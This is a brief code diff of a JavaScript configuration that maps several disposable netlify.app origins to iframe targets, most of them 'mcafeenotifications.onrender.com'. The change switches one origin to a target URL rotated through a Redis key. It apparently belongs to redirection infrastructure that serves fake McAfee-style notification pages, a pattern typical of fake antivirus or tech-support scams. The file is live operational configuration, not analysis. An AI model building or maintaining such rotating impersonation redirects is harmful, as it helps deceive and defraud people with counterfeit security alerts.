@@ -85,7 +85,7 @@ async function getRotationTarget(key) {
 const ORIGIN_GROUPS = {
   rocky: {
     "https://cheery-douhua-d9bd03.netlify.app": { method: "iframe", target: "https://kaleidoscopic-kulfi-3bb9ca.netlify.app", redisKey: "rotation:target_url" },
-    "https://cozy-kheer-cea1f9.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
+    "https://cozy-kheer-cea1f9.netlify.app": { method: "iframe", target: "https://kaleidoscopic-kulfi-3bb9ca.netlify.app", redisKey: "rotation:target_url"  },
     "https://lambent-maamoul-1de7b2.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
     "https://nimble-bonbon-e8f851.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
     "https://spontaneous-salamander-ec6bf0.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
